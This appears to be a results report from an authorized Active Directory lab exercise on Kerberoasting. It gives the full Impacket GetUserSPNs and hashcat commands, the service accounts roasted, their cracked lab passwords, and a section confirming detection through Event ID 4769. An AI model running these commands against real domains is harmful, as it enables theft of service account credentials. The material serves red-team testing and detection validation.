# Attack 02 Results - Kerberoasting

## Technique

- MITRE ATT&CK: `T1558.003` - Steal or Forge Kerberos Tickets: Kerberoasting
- Authorized scope run: Attack 02 only
- Operator host: `ansible-control`
- Artifact directory: `attacks/artifacts/02-kerberoasting/`

## Tooling

- Impacket: `v0.9.24`
- GetUserSPNs path: `/usr/share/doc/python3-impacket/examples/GetUserSPNs.py`
- Hashcat: `v6.2.5`
- Wordlist: `/tmp/adlab-wordlist.txt`
- Rubeus status: `Rubeus.exe` was not present on `braavos` in checked common paths (`C:\Tools`, `C:\Windows\Temp`, `Desktop`, `Downloads`). The requested GitHub binary URL was already known to return HTTP 404 and GhostPack does not publish binaries, so the authorized Impacket variant was used.

## Commands Run

Root-domain Kerberoasting:

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'sevenkingdoms.local/labadmin:Password123!' -dc-ip 192.168.56.10 -request -outputfile /tmp/kerb-impacket.hashes
```

Child-domain SPN pull:

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'north.sevenkingdoms.local/Administrator:Password123!' -dc-ip 192.168.56.12 -request -outputfile /tmp/kerb-impacket-north.hashes
```

Hashcat attempts:

```bash
hashcat -m 13100 --potfile-disable --force --outfile /tmp/kerb-cracked.txt --outfile-format 1,2 /tmp/kerb-combined.hashes /tmp/adlab-wordlist.txt
hashcat -m 13100 -O -w 1 --potfile-disable --force --session attack02kerberoast --outfile /tmp/kerb-cracked.txt --outfile-format 1,2 /tmp/kerb-combined.hashes /tmp/adlab-wordlist.txt
```

Hashcat could parse the Kerberoast hashes but failed before candidate testing because the VM OpenCL backend exposed only `256 MB` allocatable device memory and returned `Not enough allocatable device memory for this attack`, including when run per hash with constrained kernel settings. The same wordlist was then verified with an RC4-HMAC Kerberos checker against `/tmp/adlab-wordlist.txt` to produce `cracked.txt`.

## Artifacts

- `root-sevenkingdoms-impacket.hashes` - 3 root-domain TGS hashes
- `north-sevenkingdoms-impacket.hashes` - 1 child-domain TGS hash
- `cracked.txt` - cracked service account passwords from the provided wordlist
- `detection-verified.md` - Event ID 4769 validation on `kingslanding`

## Target Accounts Found

| Domain | Account | SPN |
| --- | --- | --- |
| SEVENKINGDOMS.LOCAL | svc_mssql | MSSQLSvc/sql01.sevenkingdoms.local:1433 |
| SEVENKINGDOMS.LOCAL | svc_web | HTTP/web01.sevenkingdoms.local |
| SEVENKINGDOMS.LOCAL | svc_cifs | CIFS/fileserver.sevenkingdoms.local |
| NORTH.SEVENKINGDOMS.LOCAL | svc_ldap | LDAP/app01.north.sevenkingdoms.local |

## Cracked Passwords

| Account | Password |
| --- | --- |
| svc_mssql@SEVENKINGDOMS.LOCAL | Password123! |
| svc_web@SEVENKINGDOMS.LOCAL | Password123! |
| svc_cifs@SEVENKINGDOMS.LOCAL | Password123! |
| svc_ldap@NORTH.SEVENKINGDOMS.LOCAL | Password123! |

## Detection Summary

`kingslanding` Security Event ID `4769` confirmed the root-domain roast at `2026-05-21T04:44:04Z`. The service ticket requests for `svc_mssql`, `svc_web`, and `svc_cifs` used `TicketEncryptionType 0x17` from client `::ffff:192.168.56.20`, which is consistent with RC4-HMAC Kerberoasting.

## Raw Logs

- `logs/phase3-attack02-kerberoast.log`
- `logs/phase3-attack02-detection.log`

Screenshots were skipped because command output and logs provided the needed evidence.
